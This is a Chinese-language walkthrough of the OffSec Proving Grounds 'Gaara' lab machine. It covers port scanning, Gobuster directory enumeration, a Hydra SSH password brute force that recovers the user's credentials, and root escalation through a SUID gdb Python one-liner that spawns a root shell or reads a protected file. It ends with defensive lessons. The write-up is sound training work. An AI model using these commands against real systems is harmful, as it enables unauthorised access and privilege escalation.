# Gaara 靶機滲透測試紀錄

> [!info] **靶機基本資訊**
> - **平台**：OffSec Proving Grounds (Play)
> - **作業系統**：Linux (Debian)
> - **難易度**：Easy
> - **開始時間**：2026-07-03

---

## 🔍 1. 偵察與列舉 (Reconnaissance & Enumeration)

### 🚀 快速連接埠掃描 (RustScan / Nmap)
使用 Nmap 掃描開放連接埠與服務版本資訊：
```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ rustscan -a 192.168.192.142 -- -sV

.........

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.38 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**掃描結果整理：**

| 連接埠 (Port) | 服務 (Service) | 版本 (Version) | 備註 / 潛在漏洞點 |
| ---------- | ------------ | ------------ | ---------- |
| 22/tcp     | SSH          | OpenSSH 7.9p1 (Debian 10) | 嘗試弱口令爆破 |
| 80/tcp     | HTTP         | Apache httpd 2.4.38 | 網頁列舉、敏感目錄掃描 |

---

### 🌐 網頁服務列舉 (Web Enumeration)
*對 80/tcp 網頁連接埠進行深入探測。*

直接訪問 `http://192.168.x.x/`，僅顯示一張圖片，無其他有用資訊。
![](image/Pasted%20image%2020260703143031.png)

#### 📁 目錄爆破 (Gobuster)
使用常見的 `common.txt` 字典進行掃描未發現結果，更換為較大的 `directory-list-2.3-medium.txt` 字典進行爆破：
```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ gobuster dir -u http://192.168.192.142/ -w /usr/share/wordlists/dirb/common.txt           
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.192.142/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htaccess            (Status: 403) [Size: 280]
.hta                 (Status: 403) [Size: 280]
.htpasswd            (Status: 403) [Size: 280]
index.html           (Status: 200) [Size: 137]
server-status        (Status: 403) [Size: 280]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```
```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ gobuster dir -u http://192.168.192.142/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 403,404 -t 50
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.192.142/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Cryoserver           (Status: 200) [Size: 327]
Progress: 220558 / 220558 (100.00%)
===============================================================
Finished
===============================================================
```
**發現的敏感路徑：**
- `http://192.168.192.142/Cryoserver`

#### 🔎 敏感資訊對比
訪問 `/Cryoserver`，滑到頁面底部發現三個 URL 連結：
- `/Temari`
- `/Kazekage`
- `/iamGaara`
	![](image/Pasted%20image%2020260703144439.png)

這三個頁面外觀相似，但透過對比，發現 `/iamGaara` 頁面在底部多出了一串字串：
`f1MgN9mTf9SNbzRygcU`

![](image/Pasted%20image%2020260703144903.png)

![](image/Pasted%20image%2020260703145004.png)

![](image/Pasted%20image%2020260703145203.png)

此字串疑似為 Base58 編碼，將其進行解碼，但解出的密碼嘗試登入 SSH 失敗，確認該密碼為 **Rabbit Hole (兔子洞)**。

![](image/Pasted%20image%2020260703145346.png)

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ ssh gaara@192.168.192.142
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
gaara@192.168.192.142's password: 
Permission denied, please try again.
```

---

## ⚡ 2. 漏洞分析與初始存取 (Vulnerability Analysis & Initial Access)

### 🕵️ 漏洞分析 (Vulnerability Assessment)
- **發現點**：在 Web 偵察中已明確得知靶機使用者名稱為 `gaara`（同時也是靶機名稱）。
- **分析思路**：在獲取明確的使用者名稱後，若該帳號配置了弱密碼，可以透過密碼暴力破解來突破 SSH 服務。

---

### 🔑 初始存取突破 (Exploitation)
使用 Hydra 對 `gaara` 使用者進行 SSH 密碼爆破：
```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ hydra -l gaara -P /usr/share/wordlists/rockyou.txt 192.168.192.142 ssh
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-03 03:01:58
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.192.142:22/
[22][ssh] host: 192.168.192.142   login: gaara   password: iloveyou2
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-03 03:02:41
```

**獲取的憑證 (Credentials Found)：**
> [!key] **Credentials**
> - **Username**: `gaara`
> - **Password**: `iloveyou2`
> - **來源**：SSH 暴力破解

**成功獲取 Shell 指令：**
```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ ssh gaara@192.168.192.142                                             
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
gaara@192.168.192.142's password: 
Linux Gaara 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
gaara@Gaara:~$ find / -type f -name local.txt 2>/dev/null
/home/gaara/local.txt
```

---

## 📈 3. 特權提升 (Privilege Escalation)

### 🕵️ 本地資訊收集 (Local Enumeration)
尋找系統中具有 SUID 權限的二進位檔案：
```bash
gaara@Gaara:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/gdb
/usr/bin/sudo
/usr/bin/gimp-2.10
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/passwd
/usr/bin/mount
/usr/bin/umount
gaara@Gaara:~$ ls -al /usr/bin/gdb
-rwsr-sr-x 1 root root 8008480 Oct 14  2019 /usr/bin/gdb
```

**發現的潛在提權向量 (PrivEsc Vectors)：**
* **SUID/SGID 檔案**：發現 `/usr/bin/gdb` 具有 SUID 權限且擁有者為 `root`。

---

### 👑 提權利用 (Exploitation to Root / SYSTEM)
由於 `gdb` 具有 SUID 權限，可利用其內建的 Python 支持環境來執行具備 root 權限的 Shell：

1. **利用命令**：
   ```bash
   gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
   ```
2. **取得特權 Shell**：
   執行上述命令後，成功取得 root Shell。
   ```bash
   gaara@Gaara:~$ gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
   GNU gdb (Debian 8.2.1-2+b3) 8.2.1
   Copyright (C) 2018 Free Software Foundation, Inc.
   License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
   This is free software: you are free to change and redistribute it.
   There is NO WARRANTY, to the extent permitted by law.
   Type "show copying" and "show warranty" for details.
   This GDB was configured as "x86_64-linux-gnu".
   Type "show configuration" for configuration details.
   For bug reporting instructions, please see:
   <http://www.gnu.org/software/gdb/bugs/>.
   Find the GDB manual and other documentation resources online at:
       <http://www.gnu.org/software/gdb/documentation/>.

   For help, type "help".
   Type "apropos word" to search for commands related to "word".
   # whoami
   root
   # find / -type f -name proof.txt 2>/dev/null
   /root/proof.txt
   ```

#### 💡 替代方案：免 Shell 直接讀取 Flag
若目標僅為獲取 Flag 內容，亦可利用 `gdb` 的 Python 環境直接讀取具有 root 權限保護的檔案：
```text
gaara@Gaara:~$ gdb -nx -ex 'python print(open("/root/proof.txt").read())' -ex quit
GNU gdb (Debian 8.2.1-2+b3) 8.2.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word".
e4bdcafb578cfa04e44f5f6a4028aa25
```

---

## 💡 4. 心得與學習點 (Key Takeaways)

1. **為什麼這個漏洞會存在？**
   - **弱密碼配置**：系統使用者 `gaara` 設定了通用且簡單的密碼 `iloveyou2`，使得攻擊者能以常見的 `rockyou.txt` 字典輕易破解。
   - **不當的權限配置**：系統中配置了不合適的 SUID 二進位檔（`/usr/bin/gdb`），此工具內建具有指令執行能力，一旦被賦予 SUID，任何本地使用者皆可藉此直接提升至 root 權限。
   - **Rabbit Hole 導向**：Web 上的 Base58 隱藏字串屬於干擾性的兔子洞，滲透測試時應保持思路靈活，切勿在此類無效憑證上停留過久，而忽略了基礎的爆破手段。

2. **安全防禦建議：**
   - 強制執行密碼複雜度策略，避免使用任何通用字典中的弱密碼。
   - 定期審計系統中的 SUID/SGID 檔案，不必要的工具與編譯器應嚴禁給予此權限，應使用 `/etc/sudoers` 進行最小權限控制。

3. **我學到了什麼新技巧？**
   - 遭遇預設目錄爆破無果時，更換為更大、更具代表性的字典是重要步驟。
   - 學會利用 `gdb` 的 Python 整合指令進行 SUID 權限逃逸。
